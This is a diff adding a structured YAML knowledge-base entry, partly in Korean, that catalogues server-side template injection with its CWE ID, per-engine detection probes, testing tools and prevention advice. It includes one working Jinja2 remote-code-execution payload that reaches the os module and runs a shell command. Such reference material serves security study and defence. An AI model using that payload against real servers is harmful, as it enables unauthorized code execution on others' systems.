@@ -1,0 +1,108 @@
+# GR Atom: Server-Side Template Injection
+# Version: 1.0
+# Created: 2025-01-29
+
+identity:
+  id: "VUL-WEB-SSTI-001"
+  name: "Server-Side Template Injection"
+  normalization:
+    normalized_name: "ssti template injection jinja2 freemarker twig rce"
+    normalization_version: "1.0"
+  aliases:
+    - "SSTI"
+    - "Template Injection"
+    - "템플릿 인젝션"
+
+classification:
+  domain: security
+  type: vulnerability
+  abstraction_level: 2
+  gr_coordinates:
+    layer: "L7"
+    zone: "Zone2"
+    tags: ["VUL", "WEB", "RCE"]
+
+definition:
+  what: |
+    서버 측 템플릿 엔진에 사용자 입력이 삽입되어
+    템플릿 코드가 실행되는 취약점이다.
+  why: |
+    원격 코드 실행이 가능하다.
+    서버 정보를 유출할 수 있다.
+  how: |
+    1. 템플릿 엔진 식별
+    2. 인젝션 포인트 탐색
+    3. 페이로드 구성
+    4. 코드 실행
+
+relations:
+  structural:
+    is_a:
+      - "VUL-WEB-001"
+    related_to:
+      - "VUL-WEB-INJECTION-001"
+      - "ATK-WEB-RCE-001"
+
+properties:
+  technical:
+    cwe_id: "CWE-1336"
+    template_engines:
+      python:
+        - name: "Jinja2"
+          probe: "{{7*7}}"
+          payload: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+        - name: "Mako"
+          probe: "${7*7}"
+      java:
+        - name: "FreeMarker"
+          probe: "${7*7}"
+        - name: "Velocity"
+          probe: "#set($x=7*7)$x"
+      php:
+        - name: "Twig"
+          probe: "{{7*7}}"
+        - name: "Smarty"
+          probe: "{php}echo 7*7;{/php}"
+      ruby:
+        - name: "ERB"
+          probe: "<%= 7*7 %>"
+    detection_probes:
+      - "{{7*7}}"
+      - "${7*7}"
+      - "<%= 7*7 %>"
+      - "{7*7}"
+    tools:
+      - "tplmap"
+      - "SSTImap"
+    prevention:
+      - "사용자 입력 샌드박싱"
+      - "안전한 템플릿 사용"
+      - "입력 검증"
+      - "로직과 표현 분리"
+
+metadata:
+  trust:
+    source: official
+    references:
+      - "PortSwigger SSTI"
+      - "CWE-1336"
+    confidence: 1.0
+    verified:
+      status: verified
+      date: 2025-01-29
+      by: "GR System"
+  temporal:
+    created: 2025-01-29
+    modified: 2025-01-29
+    revision: 1
+  security:
+    sensitivity: public
+  ai:
+    embedding_text: |
+      SSTI는 서버 측 템플릿 엔진에 코드를 주입하여
+      원격 코드 실행이 가능한 웹 취약점이다.
+    search_keywords:
+      - "SSTI"
+      - "Template Injection"
+      - "Jinja2"
+      - "FreeMarker"
